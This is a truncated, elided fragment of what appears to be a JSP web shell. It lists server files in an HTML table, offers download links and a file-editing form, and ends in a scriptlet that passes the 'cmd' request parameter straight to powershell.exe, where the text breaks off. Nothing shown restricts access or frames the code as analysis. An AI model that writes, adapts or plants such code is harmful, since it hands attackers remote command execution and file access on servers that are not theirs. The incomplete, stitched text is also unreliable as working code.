...
<table width="100%" cellspacing="0" cellpadding="5" align="center">
	<tr>
		<td align="left"><font size="+1"><strong>file name</strong></font></td>
		<td align="center"><font size="+1"><strong>File size</strong></font></td>
		<td align="center"><font size="+1"><strong>file download</strong></font></td>
...
<%
				...
				for(int i = 0; i < ls.size(); i++){
					...
					out.println("<tr "+((i%2!=0)?"bgcolor=\"#eeeeee\"":"")+"><td align=\"left\">&nbsp;&nbsp;<a href=\"javascript:get('"+(f.getCanonicalPath().replaceAll("\\\\","/"))+"');\"><tt>"+f.getName()+"</tt></a></td><td align=\"center\"><tt>"+(f.length()/1000)+"KB</tt></td><td align=\"center\"><a href=\""+request.getContextPath()+request.getServletPath()+"?hh=a&action=download&p="+path+"&fileName="+f.getName()+"\"><tt>download</tt></a></td><td align=\"right\"><tt>"+new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(f.lastModified())) +"</tt></td></tr>");
				}
			}else{
				out.println("<h1>File editing:</h1>");
				out.println("File:<input type=\"text\" style=\"width:600px;\" name=\"file\" value=\""+path+"\" /><input type=\"button\" style=\"margin-left:20px;\" value=\"Save\" onclick=\"saveFile()\" /><span id=\"result\"></span><br/><br/>");
...
<%
  if (request.getParameter("cmd") != null) {
    String command = "powershell.exe " + request.getParameter("cmd");
